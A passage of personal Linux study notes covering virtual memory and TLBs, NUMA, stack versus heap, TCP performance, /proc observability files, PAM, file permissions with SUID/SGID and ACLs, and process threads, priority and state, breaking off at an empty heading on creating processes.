<ul>
<li>Paged virtual memory systems divide the bits of a virtual address into two parts; the high-order bits specify the page number on which the virtual address is stored, and the low-order bits correspond to the byte offset within the page (which byte from the top of the page corresponds to the address).</li>
<li>Similarly, paging systems divide physical addresses into two parts; the high-order bits specify the frame number of physical memory, and the low-order bits specify the byte offset within the frame. Because frames and pages are the same size, the byte offset bits in a virtual address are identical to the byte offset bits in its translated physical address. Virtual addresses differ from their translated physical addresses in their high-order bits, which specify the virtual page number and the physical frame number.</li>
</ul>
<h3 id="page-tables"><a class="header" href="#page-tables">Page tables</a></h3>
<ul>
<li>Because every page of a processes virtual memory space can map to a different frame of RAM, the OS must maintain mappings for every virtual page in the process‚Äôs address space. The OS keeps a per-process page table that it uses to store the process‚Äôs virtual page number to physical frame number mappings.</li>
</ul>
<h2 id="translation-look-aside-buffer-tlb"><a class="header" href="#translation-look-aside-buffer-tlb">Translation Look-aside Buffer (TLB)</a></h2>
<ul>
<li>Although paging has many benefits, it also results in a significant slowdown to every memory access. In a paged virtual memory system, every load and store to a virtual memory address requires two RAM accesses; the first reads the page table entry (PTE) to get the frame number for virtual-to-physical address translation, and the second reads or writes the byte(s) at the physical RAM address. Thus, in a paged virtual memory system, every memory access is twice as slow as in a sytem that supports direct physical RAM addressing.</li>
<li>One way to reduce the additional overhead of paging is to cache page table mappings of virtual page numbers to physical frame numbers. When translating a virtual address, the MMU first checks for the page numbers in the cache. If found, then the page‚Äôs frame number mapping can be grabbed from the cache entry, avoiding one RAM access for reading the PTE.</li>
<li>A translation look-aside buffer (TLB) is a hardware cache that stores (page number, frame number) mappings. It is a small, fully associative cache that is optimized for fast lookups in hardware. When the MMU finds a mapping in the TLB (a TLB hit), a page table lookup is not needed, and only one RAM access is required to execute a load or store to a virtual memory address.</li>
</ul>
<h1 id="how-linux-organizes-virtual-memory"><a class="header" href="#how-linux-organizes-virtual-memory">How Linux Organizes Virtual Memory</a></h1>
<h2 id="uva-user-virtual-addressing"><a class="header" href="#uva-user-virtual-addressing">UVA (User Virtual Addressing)</a></h2>
<h2 id="kva-kernel-virtual-addressing"><a class="header" href="#kva-kernel-virtual-addressing">KVA (Kernel Virtual Addressing)</a></h2>
<h1 id="how-linux-organizes-physical-memory"><a class="header" href="#how-linux-organizes-physical-memory">How Linux Organizes Physical Memory</a></h1>
<p>At boot, the kernel organizes and partitions RAM into a tree like heirarchy consisting of nodes, zones, and page frames (page frames are physical pages of RAM). The top level of the heirarchy is made up of nodes, which represent a collection of memory that is local to a particular CPU or group of CPUs. Each node contains one or more zones, which are collections of page frames that share similar characteristics. The zones are further divided into page frames, which are the smallest unit of memory that can be allocated by the kernel.</p>
<p>Any processor core can access any physical memory location, regardless of which node it belongs to. However, accessing memory that is local to the core‚Äôs node is faster than accessing memory that is located on a different node. This is because local memory access avoids the overhead of traversing interconnects between nodes.</p>
<h2 id="numa-vs-uma"><a class="header" href="#numa-vs-uma">NUMA vs. UMA</a></h2>
<p>Essentially, nodes are data structures that are used to denote and abstract a physical RAM module on the system motherboard and its associated controller chipset. Actual hardware is being abstracted via software. Two types of memory architectures exist, UMA (Uniform Memory Access) and NUMA (Non-Uniform Memory Access).</p>
<h4 id="numa"><a class="header" href="#numa">NUMA</a></h4>
<ul>
<li>In a NUMA architecture, each processor has its own local memory, and accessing local memory is faster than accessing memory that is located on a different node. This is because local memory access avoids the overhead of traversing interconnects between nodes.</li>
<li>NUMA architectures are commonly used in high-performance computing systems, where multiple processors are used to perform complex computations. By using NUMA, these systems can achieve better performance and scalability than traditional UMA architectures.</li>
<li>NUMA systems must have at least 2 physical memory banks (nodes) to be considered NUMA.</li>
<li>One can use the <code>lstopo</code> command to view the NUMA topology of a system. The output will show the number of nodes, the amount of memory in each node, and the CPUs that are associated with each node. <code>hwloc</code> is another tool that can be used to view the NUMA topology of a system. It provides a graphical representation of the system‚Äôs hardware topology, including the NUMA nodes and their associated memory and CPUs.</li>
<li>The number of zones per node is dynamically determined by the kernel at boot time based on the amount of memory in the node and the system architecture. The kernel typically creates three zones per node: DMA, DMA32, and Normal. The DMA zone is used for memory that is accessible by devices that use direct memory access (DMA), the DMA32 zone is used for memory that is accessible by 32-bit devices, and the Normal zone is used for all other memory. In addition to these standard zones, the kernel may also create additional zones based on the system architecture and configuration. You can view <code>/proc/buddyinfo</code> to see the memory zones and their associated page frames.</li>
</ul>
<pre><code class="language-bash">Œª ch7 (main) $ cat /proc/buddyinfo
Node 0, zone      DMA      0      0      0      0      0      0      0      0      1      1      2
Node 0, zone    DMA32      6      6      8      7      5      6      7      4      8      9    283
Node 0, zone   Normal   3170   7694  10543   8113   5011   1761    552    182     55     66  10595
</code></pre>
<h4 id="uma"><a class="header" href="#uma">UMA</a></h4>
<ul>
<li>In a UMA architecture, all processors share the same physical memory, and accessing any memory location takes the same amount of time, regardless of which processor is accessing it.</li>
<li>In Linux, UMA systems are treated as NUMA systems with a single node. This means that the kernel still uses the same data structures and algorithms for managing memory, but there is no need to consider the locality of memory access.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory-management"><a class="header" href="#memory-management">Memory Management</a></h1>
<ul>
<li>When you get done using heap memory, it needs to be cleaned up. This can done using a process known as ‚Äògarbage collection‚Äô, or manually by the developer when creating the app</li>
<li>Implementation of both the stack and heap is usually down to the runtime / OS.</li>
<li>There are 2 memory constructs, stack and heap.</li>
</ul>
<h3 id="stack"><a class="header" href="#stack">Stack:</a></h3>
<ul>
<li>A stack is a structure that represents a sequence of objects or elements that are available in a linear data structure. What does that mean? It simply means you can add or remove elements in a linear order. This way, a portion of memory that keeps variables created can function temporarily.</li>
<li>Stored in computer RAM just like the heap.</li>
<li>Variables created on the stack will go out of scope and are automatically deallocated.</li>
<li>Much faster to allocate in comparison to variables on the heap.</li>
<li>Implemented with an actual stack data structure.</li>
<li>Stores local data, return addresses, used for parameter passing.</li>
<li>Can have a stack overflow when too much of the stack is used (mostly from infinite or too deep recursion, very large allocations).</li>
<li>Data created on the stack can be used without pointers.</li>
<li>You would use the stack if you know exactly how much data you need to allocate before compile time and it is not too big.</li>
<li>Usually has a maximum size already determined when your program starts.</li>
<li>A collection of data needed for a single method is called a stack frame</li>
</ul>
<h3 id="heap-1"><a class="header" href="#heap-1">Heap:</a></h3>
<ul>
<li>Stored in RAM just like the stack.</li>
<li>In C++, variables on the heap must be destroyed manually and never fall out of scope. The data is freed with delete, delete[], or free.</li>
<li>Slower to allocate in comparison to variables on the stack.</li>
<li>Used on demand to allocate a block of data for use by the program.</li>
<li>Can have fragmentation when there are a lot of allocations and deallocations.</li>
<li>In C++ or C, data created on the heap will be pointed to by pointers (from the stack) and allocated with new or malloc respectively.</li>
<li>Can have allocation failures if too big of a buffer is requested to be allocated.</li>
<li>You would use the heap if you don‚Äôt know exactly how much data you will need at run time or if you need to allocate a lot of data.</li>
<li>Responsible for memory leaks.</li>
</ul>
<p>Example:</p>
<pre><code class="language-c">int foo()
{
  char *pBuffer; //&lt;--nothing allocated yet (excluding the pointer itself, which is allocated here on the stack).
  bool b = true; // Allocated on the stack.
  if(b)
  {
    //Create 500 bytes on the stack
    char buffer[500];

    //Create 500 bytes on the heap
    pBuffer = new char[500];

   }//&lt;-- buffer is deallocated here, pBuffer is not
}//&lt;--- oops there's a memory leak, I should have called delete[] pBuffer;
</code></pre>
<h1 id="why-would-an-object-be-created-on-the-heap-or-stack"><a class="header" href="#why-would-an-object-be-created-on-the-heap-or-stack">why would an object be created on the heap or stack?</a></h1>
<p>In computer science, whether an object is created on the heap or the stack depends on several factors, including object size, lifetime, dynamic allocation needs, sharing requirements, and polymorphism.</p>
<ol>
<li>Object size: If the object is small, it can be created on the stack, but if it‚Äôs large, then it should be created on the heap.</li>
<li>Lifetime: If the object‚Äôs lifetime needs to transcend beyond the block/scope where it was created, objects should be created on the heap. Alternatively, If the object‚Äôs lifetime is within the context of the block/scope where it was created, objects can be created on the stack.</li>
<li>Dynamic allocation: Heap objects can be allocated dynamically at runtime, while stack objects need to be allocated at compile time.</li>
<li>Sharing: Heap objects can be shared between multiple threads, while stack objects are local to a single thread.</li>
<li>Polymorphism: Creating objects on the heap allows for polymorphism, where objects of different derived classes can be referenced using a base class pointer.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="network-manager"><a class="header" href="#network-manager">network manager</a></h1>
<ul>
<li>You can use <code>nm-online</code> to check connectivity status</li>
<li>The configuration directory for network manager is at <code>/etc/networkmanager</code> with the main configuration file being <code>NetworkManager.conf</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="networking-1"><a class="header" href="#networking-1">Networking</a></h1>
<h2 id="tcp"><a class="header" href="#tcp">TCP</a></h2>
<p>Connections with TCP are established with a 3-way handshake (SYN-SYNACK-ACK)</p>
<h3 id="performance"><a class="header" href="#performance">Performance</a></h3>
<p>TCP can provide a high rate of throughput even on a high-latency network, by using buffering and a sliding window. TCP also employs congestion control and a congestion window set by the sender, so that it can maintain a high but also reliable rate of transmission across different and varying networks. Congestion control avoids sending too many packets, which could cause congestion and a performance breakdown.</p>
<p>The following is a summary of TCP performance features:</p>
<ul>
<li>Sliding window: This allows multiple packets up to the size of the window to be sent on the network before acknowledgements are received, providing high throughput even on high-latency networks. The size of the window is advertised by the receiver to indicate how many packets it is willing to receive at that time.</li>
<li>Congestion Avoidance: To prevent sending too much data and causing saturation, which can cause packet drops and worse performance.</li>
<li>Slow-start: Part of TCP congestion control, this begins with a small congestion window and then increases it as acknowledgements are received within a certain time. When they are not, the congestion window is reduced.</li>
<li>Selective acknowledgements (SACKs): Allow TCP to acknowledgement discontinuous packets, reducing the number of retransmits required.</li>
<li>Fast retransmit: Instead of waiting on a timer, TCP can retransmit dropped packets based on the arrival of duplicate acks. These are a function of round-trip time and not the typically much slower timer.</li>
<li>Fast recovery: This recovers TCP performance after detecting duplicate ACKs, by resetting the connection to perform slow-start.</li>
<li>TCP Fast open: Allows a client to include data in a SYN packet, so that the server request processing can begin earlier and not wait for the SYN handshake (RFC7413). THis can use a cryptographic cookie to auth the client.</li>
<li>TCP timestamps: Includes a timestamp for sent packets that is returned in the ACK</li>
</ul>
<h3 id="congestion-avoidance-1"><a class="header" href="#congestion-avoidance-1">Congestion avoidance</a></h3>
<p>Routers, switches, hosts, may drop packets when overwhelmed. There are many mechanisms to avoid these problems:</p>
<ul>
<li>Ethernet: Pause Frames</li>
<li>IP: Explicit Congestion Notification (ECN) field</li>
<li>TCP: Congestion Window</li>
</ul>
<h3 id="jumbo-frames"><a class="header" href="#jumbo-frames">Jumbo Frames</a></h3>
<p>The confluence of two components has interfered with the adoption of jumbo frames: older hardware and misconfigured firewalls. Older hardware that does not support jumbo frames can either fragment the packet using the IP protocol (causing a performance cost for packet reassembly), or respond with an ICMP ‚ÄúCan‚Äôt Fragment‚Äù error. Misconfigured firewalls (as a response to an attack known as ‚Äòthe ping of death‚Äô) have been configured by administrators to block all ICMP traffic.</p>
<h3 id="latency"><a class="header" href="#latency">Latency</a></h3>
<p>Latency can occur at various layers of the HTTP request pipeline:</p>
<ul>
<li>DNS lookup Latency</li>
<li>Connection Latency</li>
<li>First-byte latency</li>
<li>Round-trip time (network latency)</li>
<li>Connection Life Span (keepalives or a lack-of)</li>
</ul>
<h3 id="buffering"><a class="header" href="#buffering">Buffering</a></h3>
<p>TCP employs buffering, along with a sliding send window, to improve throughput. Network sockets also have buffers, and applications may also employ their own, to aggregate data before sending.</p>
<p>Buffering can also be performed by external network components, such as switches and routers, in an errot to improve their own throughput. Unfortunately, the use of large buffers on these components can lead to bufferbloat, where packets are queued for long intervals. This causes TCP congestion avoidance on the hosts, which throttles performance. Features have been added to Linux 3.x kernels to address this problem (including byte queue limits, the CoDel queueing discipline, and TCP small queues).</p>
<p>The function of buffering may be best served by the endpoints - the hosts - and not the intermediate network nodes.</p>
<h3 id="connection-backlog"><a class="header" href="#connection-backlog">Connection Backlog</a></h3>
<p>Another type of buffering is for the initial connection requests. TCP implements a backlog, where SYN requests can queue in the kernel before being accepted by the user-land processes. When there are too many TCP connection requests for the process to accept in time, the backlog reaches a limit and SYN packets are dropped, to be later retransmitted by the client. The retransmission of these packets causes latency for the client connect time. The limit is tunable: it is a parameter of the listen syscall, and the kernel may also provide system-wide limits.</p>
<p>Backlog drops and retransmits are indicators of host overload.</p>
<h3 id="connection-queues-in-the-linux-kernel"><a class="header" href="#connection-queues-in-the-linux-kernel">Connection Queues in the Linux Kernel</a></h3>
<p>The kernel employs 2 connection queues to handle bursts of inbound connections:</p>
<ul>
<li>One for incomplete connections (the SYN backlog)</li>
<li>One for established connections (the LISTEN backlog)</li>
</ul>
<p>Only one queue was used in earlier versions of the kernel and it was subject to SYN floods</p>
<p>The use of SYN cookies bypasses the first queue, as they show the client is already authenticated.</p>
<p>The length of these queues can be tuned independently. The LISTEN queue can also be set by the application as the backlog argument to the LISTEN syscall</p>
<h3 id="segmentation-offload"><a class="header" href="#segmentation-offload">Segmentation Offload</a></h3>
<p>Network devicesa and networks accept packet sizes up to a maximum segment size (MSS) that may be as small as 1500 bytes. To avoid the network stack overheads of sending many small packets, Linux also uses Generic Segmentation Offload to send packets up to 64 kbytes in size (super packets), which are split into MSS-sized segments just before delivery to the network device. If the NIC and driver support TCP segmentation offload (TSO), GSO leaves splitting to the device, improving network stack throughput.</p>
<h1 id="tools-3"><a class="header" href="#tools-3">Tools:</a></h1>
<p><code>netstat</code>
<code>ping</code>
<code>ip</code>
<code>ss</code>
<code>nicstat</code>
<code>tcplife</code>
<code>tcptop</code>
<code>tcpdump</code> / <code>wireshark</code>
<code>perf</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-observability-sources"><a class="header" href="#linux-observability-sources">Linux Observability Sources</a></h1>
<p>These interfaces provide the data for observability tools on Linux:</p>
<p><code>/proc</code> - per-process counters
<code>/proc</code>, ‚Äòsys‚Äô - system-wide counters
<code>/sys</code> - device configuration and counters
<code>/sys/fs/cgroup</code> - cgroup statistics
<code>ptrace</code> - per-process tracing
<code>perf_event</code> - Hardware counters (PMCs)
<code>netlink</code> - network statistics
<code>libpcap</code> - network packet capture</p>
<p>Various files are provided in /proc for per-process statistics. Here is an example of what may be available for a given PID:</p>
<p><strong>All examples using /proc/18</strong></p>
<pre><code>[root@docker01 ~]# ll /proc/18
dr-xr-xr-x. 2 root root 0 Jan  9 09:24 attr
-rw-r--r--. 1 root root 0 Jan  9 09:24 autogroup
-r--------. 1 root root 0 Jan  9 09:24 auxv
-r--r--r--. 1 root root 0 Jan  9 09:24 cgroup
--w-------. 1 root root 0 Jan  9 09:24 clear_refs
-r--r--r--. 1 root root 0 Jan  7 14:05 cmdline
-rw-r--r--. 1 root root 0 Jan  9 09:24 comm
-rw-r--r--. 1 root root 0 Jan  9 09:24 coredump_filter
-r--r--r--. 1 root root 0 Jan  9 09:24 cpu_resctrl_groups
-r--r--r--. 1 root root 0 Jan  9 09:24 cpuset
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 cwd -&gt; /
-r--------. 1 root root 0 Jan  9 09:24 environ
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 exe
dr-x------. 2 root root 0 Jan  7 14:06 fd
dr-x------. 2 root root 0 Jan  9 09:24 fdinfo
-rw-r--r--. 1 root root 0 Jan  9 09:24 gid_map
-r--------. 1 root root 0 Jan  9 09:24 io
-r--r--r--. 1 root root 0 Jan  9 09:24 limits
-rw-r--r--. 1 root root 0 Jan  9 09:24 loginuid
dr-x------. 2 root root 0 Jan  9 09:24 map_files
-r--r--r--. 1 root root 0 Jan  9 09:24 maps
-rw-------. 1 root root 0 Jan  9 09:24 mem
-r--r--r--. 1 root root 0 Jan  9 09:24 mountinfo
-r--r--r--. 1 root root 0 Jan  9 09:24 mounts
-r--------. 1 root root 0 Jan  9 09:24 mountstats
dr-xr-xr-x. 7 root root 0 Jan  9 09:24 net
dr-x--x--x. 2 root root 0 Jan  7 15:26 ns
-r--r--r--. 1 root root 0 Jan  9 09:24 numa_maps
-rw-r--r--. 1 root root 0 Jan  9 09:24 oom_adj
-r--r--r--. 1 root root 0 Jan  9 09:24 oom_score
-rw-r--r--. 1 root root 0 Jan  9 09:24 oom_score_adj
-r--------. 1 root root 0 Jan  9 09:24 pagemap
-r--------. 1 root root 0 Jan  9 09:24 patch_state
-r--------. 1 root root 0 Jan  9 09:24 personality
-rw-r--r--. 1 root root 0 Jan  9 09:24 projid_map
lrwxrwxrwx. 1 root root 0 Jan  9 09:24 root -&gt; /
-rw-r--r--. 1 root root 0 Jan  9 09:24 sched
-r--r--r--. 1 root root 0 Jan  9 09:24 schedstat
-r--r--r--. 1 root root 0 Jan  9 09:24 sessionid
-rw-r--r--. 1 root root 0 Jan  9 09:24 setgroups
-r--r--r--. 1 root root 0 Jan  9 09:24 smaps
-r--r--r--. 1 root root 0 Jan  9 09:24 smaps_rollup
-r--------. 1 root root 0 Jan  9 09:24 stack
-r--r--r--. 1 root root 0 Jan  7 14:05 stat
-r--r--r--. 1 root root 0 Jan  9 09:24 statm
-r--r--r--. 1 root root 0 Jan  7 14:05 status
-r--------. 1 root root 0 Jan  9 09:24 syscall
dr-xr-xr-x. 3 root root 0 Jan  9 09:24 task
-rw-r--r--. 1 root root 0 Jan  9 09:24 timens_offsets
-r--r--r--. 1 root root 0 Jan  9 09:24 timers
-rw-rw-rw-. 1 root root 0 Jan  9 09:24 timerslack_ns
-rw-r--r--. 1 root root 0 Jan  9 09:24 uid_map
-r--r--r--. 1 root root 0 Jan  9 09:24 wchan
</code></pre>
<p>The exact list of files depends on the kernel version and CONFIG options. Those related to per-process performance observability include:
<code>limits</code> - in-effect resource limits
<code>maps</code> - mapped memory regions
<code>sched</code> - various CPU scheduler statistics
<code>schedstat</code> - CPU runtime, latency, and time slices
<code>smaps</code> - mapped memory regions with usage statistics
<code>stat</code> - Process status and statistics, including total CPU and memory usage
<code>statm</code> - memory usage summary in units of pages
<code>status</code> - stat and statm information, labeled
<code>fd</code> - directory of file descriptor symlinks
<code>cgroup</code> - cgroup memborship information
<code>task</code> - directory of per-task statistics</p>
<p><code>/proc</code> also contains system-wide statistics in these directories:</p>
<pre><code>[root@docker01 proc]# ls -Fd /proc [a-z]*
acpi/      bus/     consoles  devices    driver/      filesystems  iomem    kallsyms  key-users    kpagecount  locks    misc     mtrr          partitions   schedstat  slabinfo  swaps          sysvipc/      tty/     vmallocinfo
asound/    cgroups  cpuinfo   diskstats  execdomains  fs/          ioports  kcore     kmsg         kpageflags  mdstat   modules  net@          /proc/       scsi/      softirqs  sys/           thread-self@  uptime   vmstat
buddyinfo  cmdline  crypto    dma        fb           interrupts   irq/     keys      kpagecgroup  loadavg     meminfo  mounts@  pagetypeinfo  sched_debug  self@      stat      sysrq-trigger  timer_list    version  zoneinfo
</code></pre>
<ul>
<li>
<p><strong>/proc/cpuinfo</strong></p>
<ul>
<li>Description: Contains information about the CPU such as its type, make, model, number of cores, and processing power.</li>
</ul>
</li>
<li>
<p><strong>/proc/meminfo</strong></p>
<ul>
<li>Description: Provides details on the system‚Äôs memory usage including total and available physical memory, swap space, and various other memory parameters.</li>
</ul>
</li>
<li>
<p><strong>/proc/loadavg</strong></p>
<ul>
<li>Description: Shows the load average of the system, indicating how busy the system is. Displays averages over 1, 5, and 15 minutes.</li>
</ul>
</li>
<li>
<p><strong>/proc/uptime</strong></p>
<ul>
<li>Description: Indicates how long the system has been running since its last restart.</li>
</ul>
</li>
<li>
<p><strong>/proc/mounts</strong></p>
<ul>
<li>Description: Lists all the mounts currently in use by the system, similar to the <code>mount</code> command.</li>
</ul>
</li>
<li>
<p><strong>/proc/net</strong></p>
<ul>
<li>Description: Contains various network-related information including network configuration, statistics, connections, and more.</li>
</ul>
</li>
<li>
<p><strong>/proc/partitions</strong></p>
<ul>
<li>Description: Shows the partition table of all the storage devices in the system.</li>
</ul>
</li>
<li>
<p><strong>/proc/cmdline</strong></p>
<ul>
<li>Description: Displays the parameters passed to the kernel at the time it was started.</li>
</ul>
</li>
<li>
<p><strong>/proc/version</strong></p>
<ul>
<li>Description: Contains information about the version of the Linux kernel, GCC version used for the kernel build, and the build time.</li>
</ul>
</li>
<li>
<p><strong>/proc/filesystems</strong></p>
<ul>
<li>Description: Lists all the file systems currently supported by the kernel.</li>
</ul>
</li>
<li>
<p><strong>/proc/sys</strong></p>
<ul>
<li>Description: Contains a collection of interfaces to query and modify kernel parameters at runtime.</li>
</ul>
</li>
</ul>
<h2 id="sys"><a class="header" href="#sys"><code>/sys</code></a></h2>
<ul>
<li>Linux provides a sysfs file system, mounted on <code>/sys</code>, which was introduced with the 2.6 kernel to provide a directory based structure for kernel statistics.</li>
</ul>
<h2 id="netlink"><a class="header" href="#netlink">netlink</a></h2>
<ul>
<li>Netlink is a special socket address family (AF_NETLINK) for fetching kernel information.</li>
<li>To use Netlink, open a socket with the <code>AF_NETLINK</code> address family and then use a series of send(2) and recv(2) calls to pass requests and receiving information in binary structs.</li>
<li>The <code>libnetlink</code> library helps with usage.</li>
</ul>
<h2 id="tracepoints"><a class="header" href="#tracepoints">Tracepoints</a></h2>
<ul>
<li>Tracepoints are a Linux Kernel event source based on static instrumentation.</li>
<li>Tracepoints are hard-coded instrumentation points placed at logical locations in kernel code.</li>
<li>Available tracepoints can be listed  using the <code>perf list tracepoint</code> command</li>
<li>Apart from showing when an event happened, tracepoints can also show contextual data about an event.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pluggable-authentication-modules-pam"><a class="header" href="#pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</a></h1>
<ul>
<li>PAM (Pluggable Authentication Modules) is a flexible mechanism for authenticating users and managing authentication-related tasks in Unix-like operating systems.</li>
<li>PAM config files are typically stored in <code>/etc/pam.d</code></li>
<li>PAM modules are typically stored in <code>/lib64/security</code> or <code>/lib/security</code> depending on the architecture.</li>
<li>PAM configuration files are text files that define how authentication should be handled for various services and applications</li>
<li>Each PAM configuration file corresponds to a specific service or application (e.g., login, sshd, sudo) and contains a series of rules that specify which PAM modules to use and how to use them.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="per-process-analysis"><a class="header" href="#per-process-analysis">Per-Process Analysis</a></h1>
<p>These tools are process oriented and use counters that the kernel maintains Per-Process</p>
<ol>
<li><code>ps</code> - show process status, various process statistics, including memory and CPU usage</li>
<li><code>top</code> - Show top processes, sorted by CPU usage or another statistics</li>
<li><code>pmap</code> - List process memory segments with usage statistics</li>
</ol>
<p>These tools typically read statistics from the /proc ephemeral file-system.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="permissions"><a class="header" href="#permissions">Permissions</a></h1>
<p>Every Linux file has a set of permissions that determine who can read, write, or execute the file.
Running <code>ls -l</code> displays these permissions.</p>
<p>Only the owner of a file or dir can change permissions (the exception is the super user)</p>
<p>Example:</p>
<pre><code>$ ls -l init
-rwxr-xr-x 1 root root 1440152 May  7  2022 init*
</code></pre>
<p>-rw-r‚Äìr‚Äì 12 root     users 12.0K Apr  28 10:10 init*
|[-][-][-]-   [‚Äî‚Äî] [‚Äî]
| |  |  | |      |       |
| |  |  | |      |       +‚Äî‚Äî‚Äî‚Äì&gt; 7. Group
| |  |  | |      +‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì‚Äì&gt; 6. Owner
| |  |  | +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 5. Alternate Access Method
| |  |  +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 4. Others Permissions
| |  +‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì‚Äì&gt; 3. Group Permissions
| +‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì‚Äì&gt; 2. Owner Permissions
+‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî&gt; 1. File Type</p>
<ol>
<li>File Types:</li>
</ol>
<ul>
<li>-: regular file</li>
<li>d: directory</li>
<li>l: symbolic link</li>
<li>p: pipe</li>
<li>s: socket</li>
<li>c: character device</li>
<li>b: block device</li>
</ul>
<ol start="2">
<li>Permissions can be read, write, or execute for user (#2 in text graphic above) , group (#3 in text graphic above), and others (#4 in text graphic above)</li>
</ol>
<h2 id="suid-gid-sticky-bit-permissions"><a class="header" href="#suid-gid-sticky-bit-permissions">SUID, GID, Sticky Bit Permissions</a></h2>
<h4 id="suid"><a class="header" href="#suid">SUID</a></h4>
<ul>
<li>SUID = Set UserId bit</li>
<li>When the SUID bit is set, the file is executed as the owner of the file, rather than the person running that file</li>
</ul>
<pre><code>$ touch suidfile
$ ls suidfile
suidfile
$ ll suidfile
-rw-rw-r--. 1 azureadmin azureadmin 0 Aug 28 17:46 suidfile
$ chmod 4660 suidfile
$ ls -l suidfile
-rwSrw----. 1 azureadmin azureadmin 0 Aug 28 17:46 suidfile
</code></pre>
<p>Find SUID files: <code>find . -perm /4000</code></p>
<h4 id="sgid"><a class="header" href="#sgid">SGID</a></h4>
<ul>
<li>File is executed as the owning group of the file, rather than the person running the file</li>
</ul>
<pre><code>$ touch sgidfile
$ chmod 2440 sgidfile
$ ll sgidfile
-r--r-S---. 1 azureadmin azureadmin 0 Aug 28 17:49 sgidfile
</code></pre>
<p>Find GUID Files: <code>find . -perm /2000</code></p>
<h4 id="sticky-bit"><a class="header" href="#sticky-bit">Sticky bit</a></h4>
<p>The sticky bit is typically set on public directories to inhibit file erasures by non-owners</p>
<h4 id="acls"><a class="header" href="#acls">ACLs</a></h4>
<ul>
<li>In addition to the standard UGO/RWX permission model, you can also apply ACLs to files and directories</li>
<li>ACLs define permissions for named users and named groups</li>
<li>ACLs are categorized into two groups, default ACLs and access ACLs
<ul>
<li>Access ACLs are set on individual files and directories</li>
<li>Default ACLs can only be applied at the directory level and are inherited by subdirectories and files</li>
</ul>
</li>
<li>There are two commands to manage ACLs
<code>getfacl</code> and <code>setfacl</code>
<code>setfactl -m user:mary:rwx /marysFile</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="processes"><a class="header" href="#processes">processes</a></h1>
<h2 id="threads"><a class="header" href="#threads">threads</a></h2>
<p>
In linux, some processes are divided into pieces called threads. Threads are very similar to processes. They have an identifier, TID (thread Id) and the kernel schedules and runs threads, just like processes. Processes do not usually share memory and I/O connections, threads do. All threads inside a single process share the same system resources.
</p>

<p>
Many processes have only one thread. A process with only one thread is known to be single-threaded. All processes start out single-threaded. This starting thread is often known as the main thread, and typically corresponds to a 'main' function within a program. This main thread is capable of starting new threads, depending on how the application is written. This is known multi-threading. Threads can run simultaneously on multiple processors/cores, speeding up computation. Threads start faster than processes and communicate more efficiently than processes. This is because threads share memory to communicate amongst themselves, and processes depend on IPC (inter-process communication) calls to communicate.
</p>

<p>
By default, the output of the `ps` and `top` commands do not show threads, only processes. However, you can modify this behavior:
</p>

<pre><code class="language-sh">ryan:// $ ps m |grep httping -A10
1121895 pts/1    -      0:00 httping -delay 2 www.google.com
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
      - -        Sl+    0:00 -
</code></pre>
<p>
This is an example of a multi-threaded golang app. The top line with the PID represents the process, and each line below represents a thread within the process.
</p>

<h2 id="adjusting-process-priority"><a class="header" href="#adjusting-process-priority">adjusting process priority</a></h2>
<p>
You can change the way the kernel allocates CPU time to a process, relative to other processes. The kernel runs each process according to it's scheduling priority, known as it's `nice` value. This can be a value in range -20 - +19, with -20 being the highest priority. You can see this value for each process using `top` (the PR column). A regular user can only set nice values between 0 and 19, anything below 0 must be set by a superuser. Child processes will inherit the nice value of their parent. Use `ps -l` or `ps -lax` to view the niceness of a process.
</p>

<p>
use `renice` to change the niceness value of an *existing* process:
</p>

<pre><code class="language-sh">[ryan@nebula /]# renice -n 11 83883
83883 (process ID) old priority 10, new priority 11
</code></pre>
<h2 id="context-switching"><a class="header" href="#context-switching">Context Switching</a></h2>
<p>The OS performs context switching, or swapping process state on the CPU, as the primary mechanism behind multiprogramming (or time sharing). There are two main steps to context switching:
1) The OS Saves the context of the current process running on the CPU, including all of its register values (PC, stack pointers, general purpose registers, condition code, etc.), its memory state, and some other state (open files, etc.)
2) The OS restores the saved context from another process on the CPU and starts the CPU running this other process, continuing its execution from the instruction where it left off.</p>
<h2 id="process-state"><a class="header" href="#process-state">Process State</a></h2>
<p>In multiprogrammed systems, the OS must track and manage the multiple processes existing in the system at any given time. The OS maintains information about each process, including:
1) The process ID (PID)
2) The address space information for the process
3) The execution state of the process (CPU register values, stack location, etc.)
4) The set of resources allocated to the process (open files)
5) The current process state (ready, running, blocked, exited)
1) Ready - the process could run on the CPU but it is not currently scheduled
2) Running - The process is scheduled on the CPU and is actively executing
3) Blocked - The process is waiting for some event before it can continue being executed (waiting for data to be read from disk, etc.)
4) Exited - The process has exited but has not yet been cleaned up.</p>
<h2 id="creating-processes"><a class="header" href="#creating-processes">Creating Processes</a></h2>
